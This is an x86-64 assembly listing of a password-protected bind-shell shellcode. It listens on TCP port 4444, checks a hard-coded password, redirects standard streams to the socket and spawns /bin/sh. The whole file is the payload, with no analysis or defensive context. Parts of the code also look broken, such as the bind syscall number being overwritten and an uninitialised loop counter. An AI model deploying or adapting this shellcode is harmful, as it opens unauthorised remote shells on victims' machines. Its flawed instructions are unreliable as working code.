global _start
section .text

_start:

	; sock = socket(AF_INET, SOCK_STREAM, 0)
	; AF_INET = 2
	; SOCK_STREAM = 1
	; syscall number 41 

	xor rax, rax
	mov al, 41
	xor rdi, rdi	
	mov dil, 2
	xor rsi, rsi	
	mov sil, 1
	xor rdx, rdx	
	syscall

	; copy socket descriptor to rdi for future use 

	mov rdi, rax


	; server.sin_family = AF_INET 
	; server.sin_port = htons(PORT)
	; server.sin_addr.s_addr = INADDR_ANY
	; bzero(&server.sin_zero, 8)

	xor rax, rax 
	push rax
	mov dword [rsp-4], eax
	mov word [rsp-6], 0x5c11          ; port 4444
	mov byte [rsp-8], 0x2
	sub rsp, 8


	; bind(sock, (struct sockaddr *)&server, sockaddr_len)
	; syscall number 49

	xor rax, rax
	mov al, 49
	
	mov rsi, rsp
	xor rdx, rdx	
	mov al, 16
	syscall


	; listen(sock, MAX_CLIENTS)
	; syscall number 50
	
	xor rax, rax
	mov al, 50
	xor rsi, rsi	
	mov sil, 2
	syscall


	; new = accept(sock, (struct sockaddr *)&client, &sockaddr_len)
	; syscall number 43

	
	xor rax, rax
	mov al, 43
	sub rsp, 16
	mov rsi, rsp
        push 16
        mov rdx, rsp

        syscall

	mov r9, rax                     ; store the client socket description 
	xor rax, rax                    ; close parent      
	mov al, 3
        syscall

	xchg rdi , r9
	xor rsi , rsi

	; duplicate sockets

	dup2:
    	push 0x21
    	pop rax
    	syscall
    	inc rsi
    	cmp rsi , 0x2
    	loopne dup2



Checkpass:
    	
	xor rax , rax
   	push 0x10
    	pop rdx
    	sub rsp , 16                 ; 16 bytes to receive user input 
    	mov rsi , rsp
   	xor edi , edi
    	syscall                      ; system read function call
    	mov rax , 0x64726f7773736150 ; "Password"
    	lea rdi , [rel rsi]
    	scasq
    	jz Shell
    	push 0x3c
    	pop rax
    	syscall
	
Shell:

	xor rax, rax ; First NULL push
        push rax
	
	
        mov rbx, 0x68732f2f6e69622f    ; push /bin//sh in reverse
        push rbx
	mov rdi, rsp                   ; store /bin//sh address in RDI
	push rax                       ; Second NULL push
	mov rdx, rsp                   ; set RDX
	push rdi                       ; Push address of /bin//sh
	mov rsi, rsp                   ; set RSI	

	
	; Call the Execve syscall

	add rax, 59
        syscall

	
Exit:
 	
	;Exit shellcode if password is wrong
 	
	push 0x3c
     	pop rax        			;syscall number for exit is 60
     	xor rdi, rdi
     	syscall


	




	






	
	

 
